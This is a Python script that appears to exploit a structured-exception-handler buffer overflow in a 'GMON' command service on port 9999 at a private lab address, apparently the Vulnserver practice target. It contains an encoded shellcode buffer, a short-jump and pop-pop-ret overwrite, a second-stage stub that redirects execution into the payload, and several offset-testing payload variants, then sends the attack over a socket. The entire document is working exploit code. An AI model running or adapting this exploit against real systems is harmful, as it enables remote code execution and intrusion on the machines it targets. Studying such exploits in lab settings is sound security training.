#!/usr/bin/python
import socket
server = '192.168.2.213' 
sport = 9999




buf =  ""
buf += "\xbd\x76\xf8\x35\x2f\xd9\xc2\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x61\x31\x68\x15\x03\x68\x15\x83\xe8\xfc\xe2"
buf += "\x83\x43\x8c\x74\x3a\x70\x36\x6f\x65\x0c\xed\x84\xcd"
buf += "\xde\x24\xd5\xb6\x11\xef\x04\x4b\x0a\x1d\xaa\x32\xf5"
buf += "\x92\x9d\x66\xba\x3f\x13\x16\x7d\xed\x39\x33\xda\x92"
buf += "\xb7\x85\x54\x78\x65\x88\x40\x6a\xd2\x4c\xad\x34\x53"
buf += "\x39\xb0\x84\x39\x61\x65\xd9\x75\x8a\xa2\xd0\xcd\x07"
buf += "\x25\xea\x01\x7e\x9a\xb5\x01\x23\x70\x48\x9b\x1d\xba"
buf += "\xb2\xbc\x0f\x5d\x4c\xab\x0e\x66\x77\xf6\xbe\x9c\xa9"
buf += "\x6e\xe4\x19\xdf\x4e\x09\xae\x2c\x16\x88\x83\x4a\x66"
buf += "\x42\x3b\x1c\x2b\xe1\x69\x20\xb7\x8f\x9e\x81\x0c\xc1"
buf += "\xae\x07\xb8\x14\x45\x53\xb0\xb7\x35\x9a\x3f\x10\xcb"
buf += "\xd6\x63\x86\x55\xb4\x44\x70\xb5\x4a\x10\xfc\xa4\x89"
buf += "\x2e\x05\x87\xfa\xf1\xf0\x88\x33\x29\x51\x65\x04\x01"
buf += "\x59\xf6\xcc\xf8\xe0\xd6\x94\x6f\xe0\xf0\x2c\x8d\x1b"
buf += "\x24\x17\xc6\xee\x61\x3a\x3f\x5e\xea\x71\xa5\xcb\x78"
buf += "\xea\xfb\x40\x01\x66\x25\x97\x38\xfc\x65\xd0\x4d\x4b"
buf += "\x81\xcb\xe7\x36\xbf\x4a\xe2\x3a\x3c\x9d\x91\xdf\xbe"
buf += "\x73\x15\x99\x53\xb5\x69\xdf\x9d\x23\x62\x26\xf7\x5c"
buf += "\x05\x35\xce\xaf\xaa\x76\xab\x2a\x5a\xfb\x83\x85\xf0"
buf += "\x48\x38\x89\x5a\xb6\x36\x5a\x7f\xd4\xfd\x2a\x4c\xed"
buf += "\xfb\xa7\x3b\xd7\xeb\xef\x94\xd4\x61\x9a\x7c\xb2\xf6"
buf += "\x62\xf2\x91\x03\x8c\xb8\xc5\x1d\x66\x1d\x23\xf0\x5e"
buf += "\xaf\x90\x39\x7c\xe2\xff\xd4\x7c\x1e\x5b\x83\xae\xb8"
buf += "\x44\x74\x44\x4b\x79\xf3\xd1\x6e\x8a\x64\xf7\x1e\x07"
buf += "\x96\xb2\x4a\x30\x9e\xb8\xae\xca\xad\x21\x71\xb7\xc0"
buf += "\x73\x63\xba\x02\x1f\xbb\xab\x35\x67\xf2\x7c\xb0\xa8"
buf += "\x5c\xbc\x74\xde\x03\xef\x8b\x6c\x4a\xce\x56\x42\x34"
buf += "\x96\x99\xec\x46\xf6\x5c\x12\xfd\xd9\x80\x2b\x4c\x48"
buf += "\x86\xb8\xdd\x1d\x54\xeb\x81\xdd\x66\xb1\xd3\x79\xb4"
buf += "\xfe\x96\xac\x56\x33\xf8\x36\xb5\xbd\x6e\x66\x5a\xb7"
buf += "\x8c\xa5\x9e\xfc\x1d\x27\x37\x8c\x01\xae\x26"



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)

print 



jmp = "\xEB\x0F\x90\x90"; # JMP 0F, NOP, NOP
secondstage= "\x59\xFE\xCD\xFE\xCD\xFE\xCD\xFF\xE1\xE8\xF2\xFF\xFF\xFF";#for move eip our payload block


eip = '\xf9\x11\x50\x62' #jmp ecx
eip2 = '\xbd\x11\x50\x62'#jmp ebp
eip3 = "\xb4\x10\x50\x62" #rop gadget,pop-pop,return




payload = "GMON /" + "\x90" * 3084 +buf+ jmp+ "\xb4\x10\x50\x62"+secondstage
payload +="\x90"*(4000 - len(payload))


payload2 = "GMON /" + "\xCC" *3502 +"\xb4\x10\x50\x62"
payload2 +="\x90"*(4000 - len(payload))


payload3 = "GMON /.:/" + "A" * 3499 + "\x31\x31\x31\x31" + "C" * 1000 #check data(1111) sit SEH point
payload4="GMON /" + "\xCC" * 3502 + '\x31\x31\x31\x31' + "C" * 1000   #check data(1111) sit SEH point	
payload5="GMON /" + "\xCC" * 3502 + "\xb4\x10\x50\x62" + "C" *1000	
payload6="GMON /" + "\xCC" * 3502 + "\xb4\x10\x50\x62" +"\xCC" *8 + "\x59\xFE\xCD\xFE\xCD\xFE\xCD\xFF\xE1\xE8\xF2\xFF\xFF\xFF" + "\xcc"*1000

s.send(payload)
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()
